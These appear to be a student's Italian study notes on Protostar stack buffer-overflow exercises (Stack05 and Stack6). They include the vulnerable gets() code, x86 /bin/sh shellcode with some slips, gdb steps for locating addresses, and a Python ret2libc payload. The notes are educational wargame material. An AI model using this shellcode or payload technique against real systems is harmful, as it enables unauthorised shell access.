- Qui ci sarebbero altri esercizi prima che non ho inserito per motivi di voglia e semplicità come quelli sulle sql inj
## Protostar - Stack05
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
- Viene allocato un buffer di 64 caratteri sullo stack
- Si riempie il buffer con dati letti da terminale
	- input non controllato
- **gets()**
	- gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with \0. **No check for buffer overrun is performed** (see BUGS below).
	- BUGS **Never use gets()**. Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer. It is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.

## Memory Layout
- TODO: aggiungere tutta la parte sul memory layout
## Shellcode
- "/bin/sh": devo codificare in memoria questa stringa
	- ricordiamoci che siamo in un contesto little endian
	- "//sh": codifico prima questi 4 byte
		- 0x68732F2F
	- "/bin"
		- 0x6E69622F
- shellcode:
```s
	shellcode:
		xor %eax, %eax //xorando due valori uguali ottengo 0
		push %eax //metto eax sullo stack
		push $0x68732F2F // //sh
		push $0x6E69622F
		push %esp, %ebx
		mov %eax, %ecx
		mov %eax, %edx
		mov $0xb, %al
		int $0x80
		xor %eax, %eax
		inc %eax
		int $0x80
```


## Protostar - Stack6
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
- **getpath**
	- viene definito un buffer di 64 caratteri
	- viene definita una variabile senza segno int
	- si stampa un prompt
	- si legge un input da terminale e lo si salva in buffer
	- "builtin_return_address(0);": macro definita dal compilatore che fa il return dell'indirizzo dello stack frame corrente
	- Dopo controllo che l'indirizzo di ritorno sia nell'area dello stack
- A differenza della sfida precedente qui viene implementata una contromisura difensiva cioè controlla che l'indirizzo di ritorno non sia un valore dello stack cioè compreso in 0xbf000000 – 0xbffffff.
	- Se lo è lo identifica come buffer overflow e usciamo 
	- Per farlo utilizziamo la maschera 0xbf000000 che azzera tutti i bit tranne gli ultimi 2
- In conclusione non è possibile eseguire codice sullo stack
	- La libreria del C fornisce al programmatore almeno una funzione wrapper per ciascuna chiamata di sistema disponibile

### Indirizzo di System
- Per individuare l'indirizzo di system da gdb eseguire
    - p system
    - risultato:0xb7ecffb0
### Risoluzione
- breakpoint all'inizio
- Ricostruisco il layout dopo il prologo
- localizzo buffer e ret
- Continuo fino all'epilogo
- Ricostruisco il layout prima del ritorno 
#### Indirizzo di buffer
- Per individuarlo vado a mettere un brackpoint prima della gets dato che so che buffer viene passato come primo parametro e che quindi il sui indirizzo sarà nel registro eax
    - risultato: 0xb7f0186e 
    - risultato: 0xbffffc8c
    - \x6e\x18\xf0\xb7
#### Indirizzo di ret
- nel codice vediamo come ret sia uguale a -0xc($ebp) questo significa che l'indirizzo si trova in $ebp - 12
    - risultato: 0xbffffccc
#### Payload corretto
- Quello del prof fa riferimento ad indirizzi differenti, questo è quello aggiornato rispetto ai miei indirizzi
```python
#!/usr/bin/python

print '/bin//sh\x00' + 'a' * 71 + '\xb0\xff\xec\xb7' + '\x42\x42\x42\x42' + '\x8c\xfc\xff\xbf'

```


